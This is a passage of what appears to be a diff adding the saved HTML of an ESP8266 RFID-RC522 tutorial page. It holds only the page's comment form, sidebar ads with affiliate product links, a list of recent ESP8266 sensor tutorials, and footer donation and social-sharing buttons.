+	</div> <!-- ./td-related-span4 --></div><!--./row-fluid--></div><div class="td-next-prev-wrap"><a href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_4_6553840cc0136" data-td_block_id="td_uid_4_6553840cc0136"><i class="td-icon-font td-icon-menu-left"></i></a><a href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#" class="td-ajax-next-page" id="next-page-td_uid_4_6553840cc0136" data-td_block_id="td_uid_4_6553840cc0136"><i class="td-icon-font td-icon-menu-right"></i></a></div></div> <!-- ./block -->
+	<div class="comments" id="comments">
+        	<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">LEAVE A REPLY <small><a rel="nofollow" id="cancel-comment-reply-link" href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#respond" style="display:none;">Cancel reply</a></small></h3><form action="http://www.esp8266learning.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate=""><div class="clearfix"></div>
+				<div class="comment-form-input-wrap td-form-comment">
+					<textarea placeholder="Comment:" id="comment" name="comment" cols="45" rows="8" aria-required="true"></textarea>
+					<div class="td-warning-comment">Please enter your comment!</div>
+				</div>
+		        <div class="comment-form-input-wrap td-form-author">
+			            <input class="" id="author" name="author" placeholder="Name:*" type="text" value="" size="30" aria-required="true">
+			            <div class="td-warning-author">Please enter your name here</div>
+			         </div>
+<div class="comment-form-input-wrap td-form-email">
+			            <input class="" id="email" name="email" placeholder="Email:*" type="text" value="" size="30" aria-required="true">
+			            <div class="td-warning-email-error">You have entered an incorrect email address!</div>
+			            <div class="td-warning-email">Please enter your email address here</div>
+			         </div>
+<div class="comment-form-input-wrap td-form-url">
+			            <input class="" id="url" name="url" placeholder="Website:" type="text" value="" size="30">
+                     </div>
+<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes"><label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment"> <input type="hidden" name="comment_post_ID" value="488" id="comment_post_ID">
+<input type="hidden" name="comment_parent" id="comment_parent" value="0">
+</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="697195b7fc"></p><p style="display: none !important;"><label>Δ<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="1699972110106"><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
+	    </div> <!-- /.content -->
+                            </div>
+                        </div>
+                        <div class="td-pb-span4 td-main-sidebar" role="complementary">
+                            <div class="td-ss-main-sidebar">
+                                <aside class="widget_text td_block_template_1 widget widget_custom_html"><div class="textwidget custom-html-widget"><!-- Revive Adserver iFrame Tag - Generated with Revive Adserver v5.4.1 -->
+<iframe id="ae44145d" name="ae44145d" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/afr(1).html" frameborder="0" scrolling="no" width="300" height="250" allow="autoplay"><a href='https://onlymyads.website/ads/www/delivery/ck.php?n=a6b4c461&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank' rel="noopener"><img src='https://onlymyads.website/ads/www/delivery/avw.php?zoneid=16&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=a6b4c461' border='0' alt='' /></a></iframe></div></aside><aside class="widget_text td_block_template_1 widget widget_custom_html"><h4 class="block-title"><span>ESP8266 Ebook</span></h4><div class="textwidget custom-html-widget">Learn about the ESP8266 using Wemos shields
+<br><br>
+
+<strong><a hrfe="https://www.amazon.com/dp/B07QYGJZ27">BUY IT HERE</a></strong></div></aside><aside class="td_block_template_1 widget widget_text">			<div class="textwidget"><p><script async="" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/f(1).txt"></script><br>
+<!-- 160x600, created 1/2/11 --><br>
+<ins class="adsbygoogle" style="display:inline-block;width:160px;height:600px" data-ad-client="ca-pub-3520634452456567" data-ad-slot="0874787190"></ins><br>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></p>
+</div>
+		</aside>
+		<aside class="td_block_template_1 widget widget_recent_entries">
+		<h4 class="block-title"><span>Latest</span></h4>
+		<ul>
+											<li>
+					<a href="http://www.esp8266learning.com/using-a-stts22h-temperature-sensor-with-an-esp8266.php">Using a STTS22H temperature sensor with an ESP8266</a>
+									</li>
+											<li>
+					<a href="http://www.esp8266learning.com/using-a-bmp384-pressure-sensor-with-an-esp8266.php">Using a BMP384 pressure sensor  with an ESP8266</a>
+									</li>
+											<li>
+					<a href="http://www.esp8266learning.com/using-a-kx132-or-kx134-triple-axis-accelerometer-with-an-esp8266.php">Using a KX132 or KX134 Triple Axis Accelerometer with an ESP8266</a>
+									</li>
+											<li>
+					<a href="http://www.esp8266learning.com/dps310-barometric-pressure-sensor-and-esp8266-example-using-the-arduino-ide.php">DPS310 barometric pressure sensor and ESP8266 example using the Arduino IDE</a>
+									</li>
+											<li>
+					<a href="http://www.esp8266learning.com/vcnl4040-proximity-sensor-and-esp8266-example-using-the-arduino-ide.php">VCNL4040 Proximity Sensor and ESP8266 example using the Arduino IDE</a>
+									</li>
+											<li>
+					<a href="http://www.esp8266learning.com/sht40-temperature-humidity-sensor-and-esp8266-example-using-the-arduino-ide.php">SHT40 Temperature &amp; Humidity Sensor and ESP8266 example using the Arduino IDE</a>
+									</li>
+											<li>
+					<a href="http://www.esp8266learning.com/pct2075-temperature-to-digital-converter-and-esp8266-example-using-the-arduino-ide.php">PCT2075 temperature-to-digital converter and ESP8266 example using the Arduino IDE</a>
+									</li>
+											<li>
+					<a href="http://www.esp8266learning.com/aht20-temperature-humidity-sensor-and-esp8266-example-using-the-arduino-ide.php">AHT20 Temperature &amp; Humidity Sensor and ESP8266 example using the Arduino IDE</a>
+									</li>
+					</ul>
+
+		</aside><aside class="td_block_template_1 widget adrotate_widgets"><div class="g g-1"><div class="g-dyn a-24 c-1" style="display: none;"><a href="http://www.ketoconnection.net/" target="_blank"><img src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/300600banners2.png"></a></div><div class="g-dyn a-23 c-2" style="display: none;"><a href="http://www.printablegames.net/" target="_blank"><img src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/300600banners1.png"></a></div><div class="g-dyn a-22 c-3" style=""><a href="http://www.playwordgames.net/" target="_blank"><img src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/300600banners.png"></a></div><div class="g-dyn a-25 c-4" style="display: none;"><a href="https://s.click.aliexpress.com/e/_DdaMxwF" target="_blank"><img src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/300600banners3.png"></a></div></div></aside><aside class="td_block_template_1 widget adrotate_widgets"><h4 class="block-title"><span>Products</span></h4><div class="g g-2"><div class="g-col b-2 a-10"><a href="http://s.click.aliexpress.com/e/fm6qnIuzJ" target="_parent">ESP8266 WiFi Motor Drive Expansion Board, L293D ESP12E Lua Things Smart Car</a></div></div><div class="g g-2"><div class="g-col b-2 a-9"><a href="http://s.click.aliexpress.com/e/bHAIZTqg" target="_parent">Wemos D1 Mini Shields - Battery Shield Relay SHT30 TB6612 ProtoBoard and more</a></div></div><div class="g g-2"><div class="g-col b-2 a-3"><a href="http://s.click.aliexpress.com/e/byLzfWc0" target="_parent">5V ESP8266 ESP-01 4 Channel Wifi Relay Module Remote Control Switch For Smart Home IOT</a></div></div><div class="g g-2"><div class="g-col b-2 a-8"><a href="http://s.click.aliexpress.com/e/cj0UPu64" target="_parent">SHT30 Shield for WeMos D1 mini</a></div></div><div class="g g-2"><div class="g-col b-2 a-5"><a href="http://s.click.aliexpress.com/e/2kGbNsy" target="_parent">ESP8266 WeMos D1 Mini Wireless Development Module</a></div></div><div class="g g-2"><div class="g-col b-2 a-11"><a href="http://s.click.aliexpress.com/e/VjuBuRBuj" target="_parent">ESP8266 serial WIFI Witty cloud Development Board ESP-12F module</a></div></div></aside>                            </div>
+                        </div>
+                                    </div> <!-- /.td-pb-row -->
+        </div> <!-- /.td-container -->
+    </div> <!-- /.td-main-content-wrap -->
+
+<!-- Instagram -->
+
+
+
+
+	<!-- Footer -->
+	<div class="td-footer-wrapper td-footer-container td-container-wrap td-footer-template-9 ">
+    <div class="td-container">
+
+	    <div class="td-pb-row">
+		    <div class="td-pb-span12">
+                		    </div>
+	    </div>
+
+        <div class="td-pb-row">
+
+            <div class="td-pb-span4">
+                <aside class="td_block_template_1 widget widget_a2a_follow_widget"><h4 class="block-title"><span>Follow</span></h4><div class="a2a_kit a2a_kit_size_32 a2a_follow addtoany_list" data-a2a-url="http://www.esp8266learning.com/feed/" data-a2a-title="esp8266 learning" style="line-height: 32px;"><a class="a2a_button_github" href="https://github.com/getelectronics" title="GitHub" rel="noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_github" style="background-color: rgb(42, 42, 42);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M16 4.296c-6.63 0-12 5.373-12 12 0 5.312 3.434 9.796 8.206 11.387.6.105.825-.255.825-.57 0-.286-.015-1.23-.015-2.234-3.015.554-3.794-.736-4.034-1.412-.136-.345-.72-1.41-1.232-1.694-.42-.225-1.02-.78-.014-.794.945-.016 1.62.87 1.846 1.23 1.08 1.814 2.804 1.305 3.494.99.105-.78.42-1.305.766-1.606-2.67-.3-5.461-1.334-5.461-5.924 0-1.306.465-2.386 1.23-3.226-.12-.3-.544-1.53.12-3.18 0 0 1.002-.313 3.296 1.235.96-.27 1.98-.407 3-.407 1.019 0 2.04.136 3 .407 2.298-1.56 3.304-1.235 3.304-1.235.66 1.653.24 2.88.12 3.181.765.84 1.23 1.905 1.23 3.225 0 4.607-2.806 5.626-5.474 5.927.434.373.809 1.093.809 2.219 0 1.606-.015 2.894-.015 3.3 0 .314.225.686.825.566C24.566 26.093 28 21.588 28 16.296c0-6.63-5.37-12-12-12Z"></path></svg></span><span class="a2a_label">GitHub</span></a><a class="a2a_button_twitter" href="https://twitter.com/micromikemck" title="Twitter" rel="noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_twitter" style="background-color: rgb(29, 155, 240);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" d="M28 8.557a9.913 9.913 0 0 1-2.828.775 4.93 4.93 0 0 0 2.166-2.725 9.738 9.738 0 0 1-3.13 1.194 4.92 4.92 0 0 0-3.593-1.55 4.924 4.924 0 0 0-4.794 6.049c-4.09-.21-7.72-2.17-10.15-5.15a4.942 4.942 0 0 0-.665 2.477c0 1.71.87 3.214 2.19 4.1a4.968 4.968 0 0 1-2.23-.616v.06c0 2.39 1.7 4.38 3.952 4.83-.414.115-.85.174-1.297.174-.318 0-.626-.03-.928-.086a4.935 4.935 0 0 0 4.6 3.42 9.893 9.893 0 0 1-6.114 2.107c-.398 0-.79-.023-1.175-.068a13.953 13.953 0 0 0 7.55 2.213c9.056 0 14.01-7.507 14.01-14.013 0-.213-.005-.426-.015-.637.96-.695 1.795-1.56 2.455-2.55z"></path></svg></span><span class="a2a_label">Twitter</span></a><a class="a2a_button_youtube_channel" href="http://www.youtube.com/channel/UCYR5UGB3CAuuBQ-X9RLawoA" title="YouTube Channel" rel="noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_youtube" style="background-color: rgb(255, 0, 0);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" d="M26.78 11.6s-.215-1.515-.875-2.183c-.837-.876-1.774-.88-2.204-.932-3.075-.222-7.693-.222-7.693-.222h-.01s-4.618 0-7.697.222c-.43.05-1.368.056-2.205.932-.66.668-.874 2.184-.874 2.184S5 13.386 5 15.166v1.67c0 1.78.22 3.56.22 3.56s.215 1.516.874 2.184c.837.875 1.936.85 2.426.94 1.76.17 7.48.22 7.48.22s4.623-.007 7.7-.23c.43-.05 1.37-.056 2.205-.932.66-.668.875-2.184.875-2.184s.22-1.78.22-3.56v-1.67c0-1.78-.22-3.56-.22-3.56zm-13.052 7.254v-6.18l5.944 3.1-5.944 3.08z"></path></svg></span><span class="a2a_label">YouTube Channel</span></a><a class="a2a_button_feed" href="http://www.esp8266learning.com/feed/" title="RSS Feed" rel="noopener" target=""><span class="a2a_svg a2a_s__default a2a_s_feed" style="background-color: rgb(227, 112, 45);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M7.952 27a2.948 2.948 0 0 0 2.952-2.944 2.948 2.948 0 0 0-2.952-2.944A2.948 2.948 0 0 0 5 24.056 2.948 2.948 0 0 0 7.952 27ZM5.153 16.625c2.73 0 5.295 1.064 7.22 2.996a10.198 10.198 0 0 1 2.996 7.255h4.2c0-7.962-6.47-14.44-14.42-14.44v4.193l.004-.004Zm.007-7.432c9.724 0 17.636 7.932 17.636 17.682H27C27 14.812 17.203 5 5.16 5v4.193Z"></path></svg></span><span class="a2a_label">Feed</span></a></div></aside>            </div>
+
+            <div class="td-pb-span4">
+                <aside class="widget_text td_block_template_1 widget widget_custom_html"><h4 class="block-title"><span>Donations</span></h4><div class="textwidget custom-html-widget"><a href="https://ko-fi.com/D1D55GNME" target="_blank" rel="noopener"><img height="36" style="border:0px;height:36px;" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/kofi2.png" border="0" alt="Buy Me a Coffee at ko-fi.com"></a>
+
+<br><br>
+
+<a href="https://www.buymeacoffee.com/shedboy71" target="_blank" rel="noopener"><img src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;"></a>
+</div></aside>            </div>
+
+            <div class="td-pb-span4">
+                <aside class="td_block_template_1 widget widget_a2a_share_save_widget"><h4 class="block-title"><span>Share</span></h4><div class="a2a_kit a2a_kit_size_32 addtoany_list" style="line-height: 32px;"><a class="a2a_button_facebook" href="http://www.esp8266learning.com/#facebook" title="Facebook" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_facebook" style="background-color: rgb(8, 102, 255);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M28 16c0-6.627-5.373-12-12-12S4 9.373 4 16c0 5.628 3.875 10.35 9.101 11.647v-7.98h-2.474V16H13.1v-1.58c0-4.085 1.849-5.978 5.859-5.978.76 0 2.072.15 2.608.298v3.325c-.283-.03-.775-.045-1.386-.045-1.967 0-2.728.745-2.728 2.683V16h3.92l-.673 3.667h-3.247v8.245C23.395 27.195 28 22.135 28 16Z"></path></svg></span><span class="a2a_label">Facebook</span></a><a class="a2a_button_twitter" href="http://www.esp8266learning.com/#twitter" title="Twitter" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_twitter" style="background-color: rgb(29, 155, 240);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" d="M28 8.557a9.913 9.913 0 0 1-2.828.775 4.93 4.93 0 0 0 2.166-2.725 9.738 9.738 0 0 1-3.13 1.194 4.92 4.92 0 0 0-3.593-1.55 4.924 4.924 0 0 0-4.794 6.049c-4.09-.21-7.72-2.17-10.15-5.15a4.942 4.942 0 0 0-.665 2.477c0 1.71.87 3.214 2.19 4.1a4.968 4.968 0 0 1-2.23-.616v.06c0 2.39 1.7 4.38 3.952 4.83-.414.115-.85.174-1.297.174-.318 0-.626-.03-.928-.086a4.935 4.935 0 0 0 4.6 3.42 9.893 9.893 0 0 1-6.114 2.107c-.398 0-.79-.023-1.175-.068a13.953 13.953 0 0 0 7.55 2.213c9.056 0 14.01-7.507 14.01-14.013 0-.213-.005-.426-.015-.637.96-.695 1.795-1.56 2.455-2.55z"></path></svg></span><span class="a2a_label">Twitter</span></a><a class="a2a_button_email" href="http://www.esp8266learning.com/#email" title="Email" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_email" style="background-color: rgb(136, 137, 144);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M27 21.775v-9.9s-10.01 6.985-10.982 7.348C15.058 18.878 5 11.875 5 11.875v9.9c0 1.375.293 1.65 1.65 1.65h18.7c1.393 0 1.65-.242 1.65-1.65Zm-.017-11.841c0-1.002-.291-1.359-1.633-1.359H6.65c-1.38 0-1.65.429-1.65 1.43l.016.154s9.939 6.842 11 7.216C17.14 16.941 27 10.005 27 10.005l-.017-.072Z"></path></svg></span><span class="a2a_label">Email</span></a><a class="a2a_button_pinterest" href="http://www.esp8266learning.com/#pinterest" title="Pinterest" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_pinterest" style="background-color: rgb(230, 0, 35);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M15.995 4C9.361 4 4 9.37 4 15.995c0 5.084 3.16 9.428 7.622 11.176-.109-.948-.198-2.41.039-3.446.217-.938 1.402-5.963 1.402-5.963s-.356-.72-.356-1.777c0-1.668.968-2.912 2.172-2.912 1.027 0 1.52.77 1.52 1.688 0 1.027-.65 2.567-.996 3.998-.287 1.195.602 2.172 1.777 2.172 2.132 0 3.771-2.25 3.771-5.489 0-2.873-2.063-4.877-5.015-4.877-3.416 0-5.42 2.557-5.42 5.203 0 1.027.395 2.132.888 2.735a.357.357 0 0 1 .08.345c-.09.375-.297 1.195-.336 1.363-.05.217-.178.266-.405.158-1.481-.711-2.409-2.903-2.409-4.66 0-3.781 2.745-7.257 7.928-7.257 4.156 0 7.394 2.962 7.394 6.931 0 4.137-2.606 7.464-6.22 7.464-1.214 0-2.36-.632-2.744-1.383l-.75 2.854c-.267 1.046-.998 2.35-1.491 3.149a12.05 12.05 0 0 0 3.554.533C22.629 28 28 22.63 28 16.005 27.99 9.37 22.62 4 15.995 4Z"></path></svg></span><span class="a2a_label">Pinterest</span></a><a class="a2a_button_mastodon" href="http://www.esp8266learning.com/#mastodon" title="Mastodon" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_mastodon" style="background-color: rgb(99, 100, 255);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M26.5 12.187c0-4.887-3.198-6.319-3.198-6.319-1.575-.782-4.39-1.097-7.302-1.116-2.864 0-5.65.334-7.264 1.069-.029 0-3.236 1.431-3.236 6.366v3.819c.115 4.772.878 9.478 5.288 10.652 1.69.46 3.443.653 5.193.573a10.385 10.385 0 0 0 3.99-.907l-.086-1.861a12.76 12.76 0 0 1-3.885.515c-2.024-.067-4.171-.22-4.496-2.71a5.324 5.324 0 0 1-.048-.698c1.485.332 2.996.533 4.515.602a25.552 25.552 0 0 0 4.468-.267c2.863-.335 5.278-2.072 5.584-3.656a37.53 37.53 0 0 0 .477-6.062Zm-3.77 6.29h-2.35v-5.726c0-1.213-.506-1.824-1.527-1.824s-1.69.726-1.69 2.167v3.14h-2.329v-3.197c0-1.441-.563-2.167-1.69-2.167-1.125 0-1.526.611-1.526 1.823v5.728h-2.3v-5.9a4.282 4.282 0 0 1 .954-2.863 3.236 3.236 0 0 1 2.51-1.07 3.026 3.026 0 0 1 2.711 1.375l.582.955.583-.955a3.025 3.025 0 0 1 2.71-1.374 3.236 3.236 0 0 1 2.51 1.069c.656.807.995 1.825.955 2.864l-.105 5.956Z"></path></svg></span><span class="a2a_label">Mastodon</span></a><a class="a2a_button_pocket" href="http://www.esp8266learning.com/#pocket" title="Pocket" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_pocket" style="background-color: rgb(238, 64, 86);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" d="M16.005 6.244c2.927 0 5.854-.002 8.782 0 1.396.002 2.195.78 2.188 2.165-.015 2.483.116 4.985-.11 7.454-.75 8.204-10.027 12.607-16.91 8.064-3.086-2.037-4.82-4.926-4.917-8.673-.06-2.34-.034-4.684-.018-7.025.008-1.214.812-1.98 2.056-1.983 2.975-.01 5.952-.005 8.93-.007zm-5.037 5.483c-.867.093-1.365.396-1.62 1.025-.27.67-.078 1.256.417 1.732a529.74 529.74 0 0 0 5.09 4.838c.745.695 1.537.687 2.278-.01a473.74 473.74 0 0 0 4.93-4.686c.827-.797.91-1.714.252-2.38-.694-.704-1.583-.647-2.447.17-1.097 1.04-2.215 2.06-3.266 3.143-.485.492-.77.432-1.227-.027a87.392 87.392 0 0 0-3.39-3.225c-.325-.29-.77-.448-1.017-.584z"></path></svg></span><span class="a2a_label">Pocket</span></a><a class="a2a_button_sina_weibo" href="http://www.esp8266learning.com/#sina_weibo" title="Sina Weibo" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_sina_weibo" style="background-color: rgb(230, 22, 45);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g fill="#FFF"><path d="M13.92 24.99c-4.303.424-8.02-1.52-8.3-4.346-.278-2.827 2.987-5.463 7.292-5.888 4.304-.426 8.018 1.52 8.297 4.345.274 2.83-2.987 5.468-7.29 5.89m8.61-9.38c-.367-.11-.62-.184-.428-.663.416-1.046.458-1.946.01-2.59-.846-1.204-3.155-1.14-5.8-.03 0-.004-.834.362-.62-.297.406-1.31.345-2.407-.29-3.04-1.435-1.437-5.255.055-8.53 3.33C4.422 14.77 3 17.37 3 19.617c0 4.3 5.513 6.913 10.907 6.913 7.07 0 11.776-4.105 11.776-7.37 0-1.97-1.66-3.09-3.15-3.55m4.693-7.87a6.89 6.89 0 0 0-6.55-2.12h-.002a.997.997 0 0 0-.765 1.182.99.99 0 0 0 1.18.765 4.91 4.91 0 0 1 4.66 1.508 4.899 4.899 0 0 1 1.02 4.787.995.995 0 1 0 1.894.615v-.004a6.883 6.883 0 0 0-1.44-6.732m-2.622 2.37a3.343 3.343 0 0 0-3.192-1.03.852.852 0 0 0-.655 1.016.854.854 0 0 0 1.016.657v.003a1.655 1.655 0 0 1 1.564.502c.406.453.514 1.066.338 1.606h.005a.858.858 0 1 0 1.63.528 3.345 3.345 0 0 0-.7-3.28"></path><path d="M14.16 19.87c-.15.26-.484.383-.746.275-.256-.104-.335-.393-.19-.646.15-.255.47-.378.725-.276.26.094.35.386.21.644m-1.375 1.76c-.417.666-1.308.957-1.98.65-.66-.302-.855-1.072-.44-1.72.413-.645 1.274-.933 1.94-.653.673.287.888 1.054.48 1.724m1.564-4.7c-2.047-.533-4.364.49-5.254 2.293-.904 1.84-.028 3.884 2.04 4.552 2.144.69 4.67-.368 5.55-2.354.865-1.943-.216-3.943-2.336-4.49"></path></g></svg></span><span class="a2a_label">Sina Weibo</span></a><a class="a2a_button_telegram" href="http://www.esp8266learning.com/#telegram" title="Telegram" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_telegram" style="background-color: rgb(44, 165, 224);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" d="M25.515 6.896 6.027 14.41c-1.33.534-1.322 1.276-.243 1.606l5 1.56 1.72 5.66c.226.625.115.873.77.873.506 0 .73-.235 1.012-.51l2.43-2.363 5.056 3.734c.93.514 1.602.25 1.834-.863l3.32-15.638c.338-1.363-.52-1.98-1.41-1.577z"></path></svg></span><span class="a2a_label">Telegram</span></a><a class="a2a_button_vk" href="http://www.esp8266learning.com/#vk" title="VK" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_vk" style="background-color: rgb(88, 126, 163);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" fill-rule="evenodd" d="M15.764 22.223h1.315s.394-.044.6-.262c.184-.2.18-.574.18-.574s-.03-1.764.79-2.023c.81-.255 1.844 1.705 2.942 2.46.832.57 1.464.445 1.464.445l2.936-.04s1.538-.097.81-1.304c-.06-.1-.426-.894-2.186-2.526-1.843-1.71-1.594-1.434.624-4.39 1.353-1.804 1.893-2.902 1.724-3.374-.16-.45-1.153-.33-1.153-.33l-3.306.02s-.247-.034-.428.074c-.178.108-.293.356-.293.356s-.522 1.394-1.223 2.58c-1.47 2.5-2.06 2.633-2.3 2.476-.563-.36-.42-1.454-.42-2.23 0-2.423.365-3.435-.72-3.696-.357-.085-.623-.143-1.544-.15-1.182-.014-2.18.003-2.743.28-.378.185-.667.595-.49.62.218.027.713.13.975.49.34.46.33 1.496.33 1.496s.193 2.852-.46 3.206c-.442.245-1.056-.252-2.37-2.52-.67-1.163-1.18-2.446-1.18-2.446s-.1-.24-.273-.37c-.212-.155-.506-.204-.506-.204l-3.145.02s-.473.015-.647.22c-.154.183-.01.56-.01.56s2.46 5.757 5.245 8.657c2.553 2.66 5.454 2.485 5.454 2.485z" clip-rule="evenodd"></path></svg></span><span class="a2a_label">VK</span></a><a class="a2a_button_wechat" href="http://www.esp8266learning.com/#wechat" title="WeChat" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_wechat" style="background-color: rgb(123, 179, 46);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g fill="#FFF"><path d="M20.674 12.458c-2.228.116-4.165.792-5.738 2.318-1.59 1.542-2.315 3.43-2.116 5.772-.87-.108-1.664-.227-2.462-.294-.276-.023-.602.01-.836.14-.774.438-1.517.932-2.397 1.482.16-.73.266-1.37.45-1.985.137-.45.074-.7-.342-.994-2.673-1.89-3.803-4.714-2.958-7.624.78-2.69 2.697-4.323 5.302-5.173 3.555-1.16 7.55.022 9.712 2.845a6.632 6.632 0 0 1 1.38 3.516zm-10.253-.906c.025-.532-.44-1.01-.984-1.027a.997.997 0 0 0-1.038.964.984.984 0 0 0 .977 1.02 1.017 1.017 0 0 0 1.05-.96zm5.35-1.028c-.55.01-1.01.478-1 1.012.01.554.466.987 1.03.98a.982.982 0 0 0 .99-1.01.992.992 0 0 0-1.02-.982z"></path><path d="M25.68 26.347c-.705-.314-1.352-.785-2.042-.857-.686-.072-1.408.324-2.126.398-2.187.224-4.147-.386-5.762-1.88-3.073-2.842-2.634-7.2.92-9.53 3.16-2.07 7.795-1.38 10.022 1.493 1.944 2.51 1.716 5.837-.658 7.94-.687.61-.934 1.11-.493 1.917.086.148.095.336.14.523zm-8.03-7.775c.448 0 .818-.35.835-.795a.835.835 0 0 0-.83-.865.845.845 0 0 0-.84.86c.016.442.388.8.834.8zm5.176-1.658a.83.83 0 0 0-.824.794c-.02.47.347.858.813.86.45 0 .807-.34.823-.79a.825.825 0 0 0-.812-.864z"></path></g></svg></span><span class="a2a_label">WeChat</span></a><a class="a2a_button_reddit" href="http://www.esp8266learning.com/#reddit" title="Reddit" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_reddit" style="background-color: rgb(255, 69, 0);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M28.543 15.774a2.953 2.953 0 0 0-2.951-2.949 2.882 2.882 0 0 0-1.9.713 14.075 14.075 0 0 0-6.85-2.044l1.38-4.349 3.768.884a2.452 2.452 0 1 0 .24-1.176l-4.274-1a.6.6 0 0 0-.709.4l-1.659 5.224a14.314 14.314 0 0 0-7.316 2.029 2.908 2.908 0 0 0-1.872-.681 2.942 2.942 0 0 0-1.618 5.4 5.109 5.109 0 0 0-.062.765c0 4.158 5.037 7.541 11.229 7.541s11.22-3.383 11.22-7.541a5.2 5.2 0 0 0-.053-.706 2.963 2.963 0 0 0 1.427-2.51zm-18.008 1.88a1.753 1.753 0 0 1 1.73-1.74 1.73 1.73 0 0 1 1.709 1.74 1.709 1.709 0 0 1-1.709 1.711 1.733 1.733 0 0 1-1.73-1.711zm9.565 4.968a5.573 5.573 0 0 1-4.081 1.272h-.032a5.576 5.576 0 0 1-4.087-1.272.6.6 0 0 1 .844-.854 4.5 4.5 0 0 0 3.238.927h.032a4.5 4.5 0 0 0 3.237-.927.6.6 0 1 1 .844.854zm-.331-3.256a1.726 1.726 0 1 1 1.709-1.712 1.717 1.717 0 0 1-1.712 1.712z"></path></svg></span><span class="a2a_label">Reddit</span></a><a class="a2a_button_linkedin" href="http://www.esp8266learning.com/#linkedin" title="LinkedIn" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_linkedin" style="background-color: rgb(0, 123, 181);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" d="M6.227 12.61h4.19v13.48h-4.19V12.61zm2.095-6.7a2.43 2.43 0 0 1 0 4.86c-1.344 0-2.428-1.09-2.428-2.43s1.084-2.43 2.428-2.43m4.72 6.7h4.02v1.84h.058c.56-1.058 1.927-2.176 3.965-2.176 4.238 0 5.02 2.792 5.02 6.42v7.395h-4.183v-6.56c0-1.564-.03-3.574-2.178-3.574-2.18 0-2.514 1.7-2.514 3.46v6.668h-4.187V12.61z"></path></svg></span><span class="a2a_label">LinkedIn</span></a><a class="a2a_dd addtoany_share_save addtoany_share" 